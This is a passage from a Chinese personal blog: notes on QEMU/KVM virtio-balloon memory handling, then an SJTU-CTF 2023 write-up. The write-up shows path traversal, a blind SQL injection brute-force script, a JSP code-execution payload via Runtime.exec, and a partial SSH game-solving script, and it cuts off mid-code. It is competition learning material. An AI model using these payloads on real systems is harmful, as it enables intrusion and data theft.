<p>这里没有手动unmap的原因是 madvise之后 内核如果真的free page 也需要修改自己的页表 并且调用mmu notify 最终通知kvm <code>kvm_mmu_notifier_invalidate_range_start</code>host上加输出可以看到</p>
<p>mm&#x2F;madvise.c </p>
<p><code>do_madvise</code>-&gt;<code>madvise_vma_behavior</code>-&gt;<code>madvise_dontneed_free</code>-&gt;<code>madvise_dontneed_single_vma</code>-&gt;<code>zap_page_range</code>-&gt;</p>
<p><code>mmu_notifier_invalidate_range_start</code> 解kvm ept</p>
<p><code>unmap_single_vma</code> 解kernel</p>
<p>这里只是unmap 但是并没有free掉相应的物理内存(修改page元数据 还给buddy system) 那不还是用不了？</p>
<blockquote>
<p>成功执行<strong>MADV_DONTNEED</strong>操作之后，访问指定区域的语义将发生变化：后续访问这些页面将会成功，但是会导致从底层映射文件中重新填充内容(用于共享文件映射、共享匿名映射及shmem等)或者导致私有映射的零填充按需页面。因此此操作是直接将page给回收了，从对私有映射的处理来看，与swap还是略微不同的。</p>
<p>需要注意的是，当应用于共享映射时，<strong>MADV_DONTNEED</strong> 可能不会立即释放范围内的页面。内核可以自由地选择合适的时机来释放页面。然而，调用进程的常驻集大小 (RSS) 将立即减少。</p>
<p>作者：蟹蟹宁<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/965b1ed71ae4">https://www.jianshu.com/p/965b1ed71ae4</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>用的是inflate存下来的page 一模一样的</p>
<p>其实deflate是无所谓的 根据现有的所有机制 VM想用就用就行了</p>
<p>qemu</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_balloon_handle_output</span><span class="params">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class="line">    VirtQueueElement *elem;</span><br><span class="line">    MemoryRegionSection section;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint32_t</span> pfn;</span><br><span class="line"></span><br><span class="line">        elem = virtqueue_pop(vq, <span class="keyword">sizeof</span>(VirtQueueElement));</span><br><span class="line">        <span class="keyword">if</span> (!elem) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class="number">4</span>) == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class="line">            hwaddr pa;</span><br><span class="line"></span><br><span class="line">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class="line">            offset += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">            section = memory_region_find(get_system_memory(), pa,</span><br><span class="line">                                         BALLOON_PAGE_SIZE);</span><br><span class="line">            <span class="keyword">if</span> (!section.mr) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class="line">                memory_region_is_rom(section.mr) ||</span><br><span class="line">                memory_region_is_romd(section.mr)) &#123;</span><br><span class="line">                trace_virtio_balloon_bad_addr(pa);</span><br><span class="line">                memory_region_unref(section.mr);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class="line">                                               pa);</span><br><span class="line">            <span class="keyword">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class="line">                    balloon_inflate_page(s, section.mr,</span><br><span class="line">                                         section.offset_within_region, &amp;pbp);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class="line">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    g_assert_not_reached();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            memory_region_unref(section.mr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        virtqueue_push(vq, elem, <span class="number">0</span>);</span><br><span class="line">        virtio_notify(vdev, vq);</span><br><span class="line">        g_free(elem);</span><br><span class="line">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">balloon_deflate_page</span><span class="params">(VirtIOBalloon *balloon,</span></span><br><span class="line"><span class="params">                                 MemoryRegion *mr, hwaddr mr_offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> rb_offset;</span><br><span class="line">    RAMBlock *rb;</span><br><span class="line">    <span class="type">size_t</span> rb_page_size;</span><br><span class="line">    <span class="type">void</span> *host_addr;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class="line"><span class="comment">     * host address? */</span></span><br><span class="line">    rb = qemu_ram_block_from_host(addr, <span class="literal">false</span>, &amp;rb_offset);</span><br><span class="line">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span class="line"></span><br><span class="line">    host_addr = (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)addr &amp; ~(rb_page_size - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When a page is deflated, we hint the whole host page it lives</span></span><br><span class="line"><span class="comment">     * on, since we can&#x27;t do anything smaller */</span></span><br><span class="line">    ret = qemu_madvise(host_addr, rb_page_size, QEMU_MADV_WILLNEED);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        warn_report(<span class="string">&quot;Couldn&#x27;t MADV_WILLNEED on balloon deflate: %s&quot;</span>,</span><br><span class="line">                    strerror(errno));</span><br><span class="line">        <span class="comment">/* Otherwise ignore, failing to page hint shouldn&#x27;t be fatal */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wait_event在include&#x2F;linux&#x2F;wait.h</p>
<p>___wait_event</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/" class="post-title-link" itemprop="url">SJTU-CTF 2023 Writeup</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:48:28 / Modified: 20:49:52" itemprop="dateCreated datePublished" datetime="2024-01-22T20:48:28+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>39k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>2:23</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SJTU-CTF-2023-Writeup"><a href="#SJTU-CTF-2023-Writeup" class="headerlink" title="SJTU-CTF 2023 Writeup"></a>SJTU-CTF 2023 Writeup</h1><p>[TOC]</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="flag-gallery"><a href="#flag-gallery" class="headerlink" title="flag gallery"></a>flag gallery</h3><p>F12看网络 可以看到请求了getflag.php?flag&#x3D;<br>尝试改参数，发现可以读其他文件 并且没有限制路径，但是根目录的flag没有权限<br><a target="_blank" rel="noopener" href="http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php">http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php</a><br>可以看到给了密码的md5哈希 最早以为这个没法碰撞，想别的思路了 比如提权 后来发现可以直接用<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a> 找到密码是sjtuctf</p>
<h3 id="Mimic-SQL"><a href="#Mimic-SQL" class="headerlink" title="Mimic SQL"></a>Mimic SQL</h3><p><code>select * from article where id=(select id from flag where flag like &#39;0%&#39;)</code> 可以根据查询到结果与否逐个爆破flag的每个字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">t</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0ops&#123;65BDC40EC5FF286E2E0B3C71BF3247D8&#125;</span></span><br><span class="line">base = <span class="string">&quot;http://8d5affacfc024519894c9d2345f17bdf.penguin.0ops.sjtu.cn:8080/article?id=&quot;</span></span><br><span class="line"></span><br><span class="line">flag_c = <span class="string">&#x27;0ops&#123;&#x27;</span></span><br><span class="line">real_flag = flag_c</span><br><span class="line">flag = flag_c</span><br><span class="line">find = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> find:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(c) <span class="keyword">in</span> <span class="string">&#x27;_%&#x27;</span>:</span><br><span class="line">            flag = flag_c + <span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>]&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = flag_c + <span class="built_in">chr</span>(c)</span><br><span class="line">        </span><br><span class="line">        query = <span class="string">f&quot;(select id from flag where flag like &#x27;<span class="subst">&#123;flag&#125;</span>%&#x27;)&quot;</span></span><br><span class="line">        <span class="comment">#print(query)</span></span><br><span class="line">        res = requests.get(base+urllib.parse.quote(query))</span><br><span class="line">        <span class="keyword">if</span> check(res.text):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                find = <span class="literal">True</span></span><br><span class="line">            flag_c = flag</span><br><span class="line">            real_flag = flag_c + <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span>(flag_c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(real_flag.lower())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ezjsp"><a href="#ezjsp" class="headerlink" title="ezjsp"></a>ezjsp</h3><p>刚开始以为嵌入代码的标签都被过滤了 只能用el表达式 参考了这篇文章<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43147039/article/details/116885802">一次jsp上传绕过的思考 –yzddMr6_yzddMr6的博客-CSDN博客</a><br>尝试用[‘’]绕过. 用反射代替new等<br>后来偶然发现竟然可以直接用&lt;%%&gt;注入java代码 不会被过滤 .也不会</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    out.println(Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/readflag &gt; /usr/local/tomcat/webapps/ROOT/upload/flag.txt&quot;</span>&#125;).waitFor());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/227181.htm#_lab2_1_2">调用java.lang.Runtime.exec的正确姿势分享_java_脚本之家 (jb51.net)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/dingding_ting/article/details/121215718">Process.waitFor()方法的返回值_永远不要矫情的博客-CSDN博客</a><br>返回0表示执行成功，然后用url读返回的地址即可拿到flag</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="简单的RPG1"><a href="#简单的RPG1" class="headerlink" title="简单的RPG1"></a>简单的RPG1</h3><p>简单模拟 异或可以反推</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">stage1key=[<span class="number">157</span>, <span class="number">212</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">249</span>, <span class="number">234</span>, <span class="number">171</span>, <span class="number">226</span>, <span class="number">140</span>, <span class="number">204</span>, <span class="number">135</span>, <span class="number">167</span>, <span class="number">241</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">26</span>, <span class="number">77</span>, <span class="number">92</span>, <span class="number">63</span>, <span class="number">118</span>, <span class="number">118</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">10</span>, <span class="number">60</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = <span class="number">0</span></span><br><span class="line">choice = []</span><br><span class="line"><span class="keyword">while</span> status &lt; <span class="built_in">len</span>(stage1key):</span><br><span class="line">    choice.append((status*<span class="number">9</span>)^<span class="number">0x86</span>^stage1key[status])</span><br><span class="line">    status += <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">status = 0</span></span><br><span class="line"><span class="string">while status &lt; len(stage1key):</span></span><br><span class="line"><span class="string">    print(choice[status]^(status*9)^0x86,stage1key[status])</span></span><br><span class="line"><span class="string">    status += 1</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for c in choice:</span></span><br><span class="line"><span class="string">    print(chr(c))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">&#x27;0ops&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">        flag = data[data.find(<span class="string">&#x27;0ops&#x27;</span>):]</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line"></span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">n = <span class="number">102400</span></span><br><span class="line">ssh.connect(<span class="string">&#x27;111.186.57.85&#x27;</span>,<span class="number">40150</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">s = ssh.invoke_shell(width=<span class="number">181</span>,height=<span class="number">58</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">begin</span>():</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    b()</span><br><span class="line">    <span class="comment">#print(dir(s))</span></span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b()</span><br><span class="line">        <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(&#x27;menu&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage1</span>():</span><br><span class="line">    s.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;play stage 1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> choice:</span><br><span class="line">        s.send(c.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag1 = data[data.find(<span class="string">&#x27;0ops&#x27;</span>):]</span><br><span class="line">    <span class="built_in">print</span>(flag1)</span><br><span class="line">    <span class="built_in">print</span>(data[:<span class="number">20</span>],data[-<span class="number">20</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#begin()</span></span><br><span class="line"><span class="comment">#stage1()</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./direction.txt&#x27;</span>)</span><br><span class="line">direction = f.read().split(<span class="string">&#x27;,&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">direction = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> direction]</span><br><span class="line"><span class="built_in">print</span>(direction)</span><br><span class="line"><span class="comment">#print(direction)</span></span><br><span class="line"><span class="comment">#direction = [0 for i in range(10)]</span></span><br><span class="line"><span class="comment">#f = open(&#x27;direction.pkl&#x27;,&#x27;rb&#x27;)</span></span><br><span class="line"><span class="comment">#direction = pickle.load(f)</span></span><br><span class="line"><span class="comment">#print(direction)</span></span><br><span class="line">n2d = &#123;<span class="number">0</span>:<span class="string">&#x27;w&#x27;</span>,<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>:<span class="string">&#x27;s&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isCorrect</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data.find(<span class="string">&#x27;路口&#x27;</span>)!=-<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage2</span>():</span><br><span class="line">    </span><br><span class="line">    s.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line">    <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(&#x27;play stage 2&#x27;)</span></span><br><span class="line">    s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    b()</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line"></span><br><span class="line">    fail = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    level = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> level &lt; <span class="number">10</span> <span class="keyword">and</span> fail &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="comment">#print(f&#x27;&#123;fail=&#125;&#x27;)</span></span><br><span class="line">        <span class="comment">#print(f&#x27;&#123;level=&#125;,direction=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class="line">        s.send(n2d[direction[level]])</span><br><span class="line">        b()</span><br><span class="line"></span><br><span class="line">        data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b()</span><br><span class="line">        <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(isCorrect(data))</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(isCorrect(data)):</span><br><span class="line">            <span class="comment">#print(f&#x27;d[&#123;level&#125;]=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class="line">            level+=<span class="number">1</span></span><br><span 